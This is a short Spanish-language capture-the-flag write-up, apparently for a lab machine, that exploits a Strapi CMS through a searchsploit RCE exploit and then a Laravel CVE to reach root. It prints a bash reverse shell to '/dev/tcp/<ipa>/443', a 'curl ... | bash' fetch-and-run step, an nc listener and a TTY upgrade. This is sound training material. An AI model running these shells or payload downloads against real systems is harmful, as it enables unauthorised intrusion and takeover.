---
title: "Hozizontall"
description: "Hozizontall"
pubDate: 2025-05-20
---

# Fase de reconocimiento

80

## Enumeración

Enocntramos un JS en la web que redirige a una API

# Fase de ataque

La API contiene un panel de administacion CMS Strapi
Buscamos posibles vulnerabilidades

````
searchesploit strapi
````

Hay un exploit de RCE
Traemos el exploit para ejecutarlo

````
searchesploit -m <ruta vista>
````

Ejecutamos

````
python3 <exploit.py> http://<webstrapi>
````

Conseguimos ejeucion remota pero bind

## Conseguir Reverse shell

1. Creamos un archivo.html con la shell

````
#!/bin/bash

bash -i >& /dev/tcp/<ipa>/443 0>&1
````

2. Creamos una web para alojar el archivo

````
python3 -m http.server 80
````

3. Nos ponemos en escucha

````
nc -nlvp 443
````

4. En el RCE eejuctamos el archivo

````
curl http://<ipa>/<archivo> | bash
````

\[-\] ==pwned!==

## Ajustar terminal

````
script /dev/null -c bash
````

ctrl + z

````
stty raw -echo; fg
````

````
	reset xterm
````

````
export TERM=xterm
````

# Privilege Escalation

Encontramos una web CMS interna Lavarel

````
netstat -nat
````

Lo traemos a nuestra maquina local con PortForwading
Encontramos un CVE y utilizamos el exploit para ganar acceso como root

1. Creamos un archivo.html con la shell

````
#!/bin/bash

bash -i >& /dev/tcp/<ipa>/443 0>&1
````

2. Creamos una web para alojar el archivo

````
python3 -m http.server 80
````

3. Nos ponemos en escucha

````
nc -nlvp 443
````

4. En el RCE eejuctamos el archivo

````
curl http://<ipa>/<archivo> | bash
````

\[+\] ==pwned!==
